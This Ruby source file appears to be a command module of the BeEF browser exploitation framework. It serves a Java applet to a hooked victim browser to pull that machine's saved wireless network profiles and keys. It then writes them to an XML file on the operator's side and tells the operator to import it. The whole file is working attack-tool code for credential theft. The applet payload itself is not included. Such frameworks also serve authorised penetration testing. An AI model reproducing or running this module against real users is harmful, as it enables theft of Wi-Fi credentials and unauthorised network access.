#
#   Copyright 2012 Wade Alcorn wade@bindshell.net
#
#   Licensed under the Apache License, Version 2.0 (the "License");
#   you may not use this file except in compliance with the License.
#   You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS,
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#   See the License for the specific language governing permissions and
#   limitations under the License.
#
class Get_wireless_keys < BeEF::Core::Command
  
	def pre_send
		BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/host/get_wireless_keys/wirelessZeroConfig.jar','/wirelessZeroConfig','jar')
	end
  
	def post_execute
		content = {}
		content['result'] = @datastore['result'].to_s
		save content
		f = File.open("exported_wlan_profiles.xml","w+")
		f.write((@datastore['results']).sub("result=",""))
  		writeToResults = Hash.new
   		writeToResults['data'] = "Please import "+Dir.pwd+"/exported_wlan_profiles.xml into your windows machine"
		BeEF::Core::Models::Command.save_result(@datastore['beefhook'], @datastore['cid'] , @friendlyname, writeToResults)
		BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/wirelessZeroConfig.jar')
	end
  
end

